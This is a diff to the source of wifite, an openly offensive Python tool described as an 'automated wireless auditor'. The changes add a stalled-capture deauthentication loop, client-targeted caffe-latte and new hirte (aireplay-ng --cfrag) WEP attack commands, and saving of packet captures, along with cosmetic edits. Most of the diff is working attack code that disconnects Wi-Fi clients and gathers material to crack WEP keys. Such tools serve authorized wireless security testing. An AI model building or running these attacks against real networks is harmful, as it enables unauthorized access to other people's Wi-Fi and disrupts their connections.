@@ -8,19 +8,15 @@
 	author: derv82 at gmail
 	
 	TODO:
-	 * Test injection at startup? (skippable via command-line switch)
-	 
+	 * Check for airmon-ng, aircrack-ng, airodump-ng, aireplay-ng at startup.
+	 * Warn if tshark is not found.
+	 * Show where to download reaver.
+
 	 * Deauth broadcast/clients on APs with unknown ESSID's when on fixed channel
 	 
 	 * WEP:
 	   - ability to pause/skip/continue	 
-	   - option to save .ivs or .cap files for last (if failed) (-save)
-	   - attacks to add (don't forget -m <minbytes>):
-	      interactive: aireplay-ng --interactive -b 00:11:6B:28:30:14 -d ff:ff:ff:ff:ff:ff -t 1 wlan0
-	                        -d > broadcast destination, -t selects packets with ToDS set
-	      p0841:       aireplay-ng --interactive -b 00:11:6B:28:30:14 -d ff:ff:ff:ff:ff:ff -t 1 wlan0
-	      hirte:       aireplay-ng --cfrag -h 00:C0:CA:3E:67:C6 -D mon0
-	     deauth clients to generate new packets if ivs/sec == 0
+	   - deauth clients to generate new packets if ivs/sec == 0
 	 
 	 * Option to "analyze" or "check" cap files for handshakes - in progress.
 	 
@@ -41,6 +37,8 @@
 	
 	MIGHTDO:
 	  * WPA - crack (pyrit/cowpatty) (not really important)
+	  * Test injection at startup? (skippable via command-line switch)
+	 
 """
 
 
@@ -220,6 +218,10 @@ def main():
 	global TARGETS_REMAINING, THIS_MAC
 	
 	handle_args() # Parse args from command line, set global variables.
+	
+	if not program_exists('reaver'):
+		print O+' [!]'+R+' the program '+O+'reaver'+R+' is required for WPS attacks'+W
+		print O+' [!]'+R+' reaver is available at: '+C+'http://code.google.com/p/reaver-wps/\n'
 	
 	# The "get_iface" method anonymizes the MAC address (if needed)
 	# and puts the interface into monitor mode.
@@ -499,7 +501,7 @@ def banner():
 	print G+".;'  ,;'  ,;'     `;,  `;,  `;,  "
 	print G+"::   ::   :   "+GR+"( )"+G+"   :   ::   ::  "+GR+"automated wireless auditor"
 	print G+"':.  ':.  ':. "+GR+"/_\\"+G+" ,:'  ,:'  ,:'  "
-	print G+" ':.  ':.    "+GR+"/___\\"+G+"    ,:'  ,:'   "+GR+"designed for backtrack5r1"
+	print G+" ':.  ':.    "+GR+"/___\\"+G+"    ,:'  ,:'   "+GR+"designed for backtrack 5 r1"
 	print G+"  ':.       "+GR+"/_____\\"+G+"      ,:'     "
 	print G+"           "+GR+"/       \\"+G+"             "
 	print W	
@@ -630,8 +632,8 @@ def get_iface():
 		monitors.append(line)
 	
 	if len(monitors) == 0:
-		print O+'[!]'+R+" no wireless interfaces were found."+W
-		print O+'[!]'+R+" you need to plug in a wifi device or install drivers."+W
+		print O+' [!]'+R+" no wireless interfaces were found."+W
+		print O+' [!]'+R+" you need to plug in a wifi device or install drivers."+W
 		exit_gracefully(0)
 	elif WIRELESS_IFACE != '' and monitors.count(WIRELESS_IFACE) > 0:
 		mac_anonymize(monitor)
@@ -1837,11 +1839,12 @@ def attack_wep(iface, target, clients):
 			
 			print ' %s captured %s ivs @ %s iv/sec' % (GR+sec_to_hms(WEP_TIMEOUT)+W, G+'0'+W, G+'0'+W),
 			stdout.flush()
-
+			
 			time.sleep(1)
 			if attack_num == 1:
 				# Send a deauth packet to broadcast and all clients *just because!*
 				wep_send_deauths(iface, target, clients)
+			last_deauth = time.time()
 			
 			replaying = False
 			time_started = time.time()
@@ -1858,6 +1861,13 @@ def attack_wep(iface, target, clients):
 					ivs = int(csv[0].data)
 					print "\r %s captured %s%d%s ivs @ %s%d%s iv/sec" % \
 					          (GR+current_hms+W, G, ivs, W, G, (ivs - last_ivs) / 5, W),
+
+					if ivs - last_ivs == 0 and time.time() - last_deauth > 30:
+						print "\r %s deauthing to generate packets..." % (GR+current_hms+W),
+						wep_send_deauths(iface, target, clients)
+						print "done"
+						last_deauth = time.time()
+
 					last_ivs = ivs
 					stdout.flush()
 					if ivs >= WEP_CRACK_AT_IVS and not started_cracking:
@@ -1977,10 +1987,11 @@ def attack_wep(iface, target, clients):
 		
 		if WEP_SAVE:
 			# Save packets
-			save_as = re.sub(r'[^a-zA-Z0-9]', '', target.ssid) + '_' + target.bssid.replace(':', '-') + '.cap'
-			copy(temp + 'wep-01.cap', save_as)
-			print GR+' [+]'+W+' packet capture '+G+'saved'+W+' to '+G+save_as+W
-			pass
+			save_as = re.sub(r'[^a-zA-Z0-9]', '', target.ssid) + '_' + target.bssid.replace(':', '-') + '.cap'+W
+			try:            os.rename(temp + 'wep-01.cap', save_as)
+			except OSError: print R+' [!]'+O+' unable to save capture file!'+W
+			else:           print GR+' [+]'+W+' packet capture '+G+'saved'+W+' to '+G+save_as+W
+			
 		
 	if successful:
 		print GR+'\n [0:00:00]'+W+' attack completed: '+G+'success!'+W
@@ -2098,20 +2109,16 @@ def get_aireplay_command(iface, attack_num, target, clients, client_mac):
 		cmd.append(iface)
 	
 	elif attack_num == 3:
-		#if len(clients) == 0:
-		#	print R+' [0:00:00] unable to carry out caffe-latte attack: '+O+'no clients'
-		#	return ''
-		# Doesn't actually require specific clients, some new clients may show up after attack begins.
 		cmd = ['aireplay-ng',
 		       '--caffe-latte',
-		       '-b', target.bssid,
-		       iface]
+		       '-b', target.bssid]
+		if len(clients) > 0:
+			cmd.append('-h')
+			cmd.append(clients[0])
+		
+		cmd.append(iface)
 		
 	elif attack_num == 4:
-		#if len(clients) == 0:
-		#	print R+' [0:00:00] unable to carry out -p0841 attack: '+O+'no clients'
-		#	return ''
-		# Doesn't actually require specific clients, some new clients may show up after attack begins.
 		cmd = ['aireplay-ng',
 		       '--interactive',
 		       '-b', target.bssid,
@@ -2121,6 +2128,16 @@ def get_aireplay_command(iface, attack_num, target, clients, client_mac):
 		       '-F',      # Automatically choose the first packet
 		       '-p', '0841']
 		cmd.append(iface)
+	
+	elif attack_num == 5:
+		if len(clients) == 0:
+			print R+' [0:00:00] unable to carry out hirte attack: '+O+'no clients'
+			return ''
+		cmd = ['aireplay-ng',
+		       '--cfrag',
+		       '-h', clients[0],
+		       iface]
+		
 	return cmd
 
 
